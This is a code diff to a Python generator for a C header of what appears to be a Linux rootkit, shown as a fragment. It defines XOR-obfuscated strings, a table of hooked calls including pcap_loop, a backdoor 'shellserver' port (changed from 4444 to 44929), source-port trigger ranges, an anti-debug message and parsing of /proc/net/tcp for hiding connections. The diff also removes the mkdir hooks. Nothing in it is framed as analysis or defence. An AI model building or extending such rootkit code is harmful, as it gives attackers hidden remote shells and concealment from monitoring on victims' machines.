@@ -47,8 +47,8 @@ header_template = '''#define _GNU_SOURCE
 #define MAX_LEN 1024
 
 #define SHELL_SERVER_PORT\t{shell_server_port}
-#define LOW_PORT\t{low_port}
-#define HIGH_PORT\t{high_port}
+#define SRC_LOW_PORT\t{src_low_port}
+#define SRC_HIGH_PORT\t{src_high_port}
 
 #define O_RDWR 02
 #define O_RDONLY 00
@@ -64,11 +64,9 @@ header_template = '''#define _GNU_SOURCE
 #define SYS_UNLINKAT 8
 #define SYS_XSTAT 9
 #define SYS_LXSTAT 10
-#define SYS_MKDIR 11
-#define SYS_MKDIRAT 12
-#define SYS_PCAP_LOOP 13
+#define SYS_PCAP_LOOP 11
 
-#define SYSCALL_SIZE 14
+#define SYSCALL_SIZE 12
 
 static char *syscall_table[SYSCALL_SIZE] = {{
 '''
@@ -85,8 +83,6 @@ syscalls = [
     "unlinkat",
     "stat",
     "lstat",
-    "mkdir",
-    "mkdirat",
     "pcap_loop"
 ]
 
@@ -104,13 +100,13 @@ header = header_template.format(
     sys_write=xor("write"),
     sys_read=xor("read"),
     shell_msg=xor("Welcome to the shell!\n"),
-    low_port=61041,
-    high_port=61051,
     shell_server=xor("shellserver"),
-    shell_server_port=4444,
+    shell_server_port=44929,
+    src_low_port=47001,
+    src_high_port=52001,
     cmd_proc_name=xor("/proc/%d/status"),
     proc_path=xor("/proc/"),
-    anti_debug_msg=xor("Don't scratch the walls"),
+    anti_debug_msg=xor("Don't scratch the walls!"),
     proc_net_tcp=xor("/proc/net/tcp"),
     proc_net_tcp6=xor("/proc/net/tcp6"),
     scanf_line=xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n")
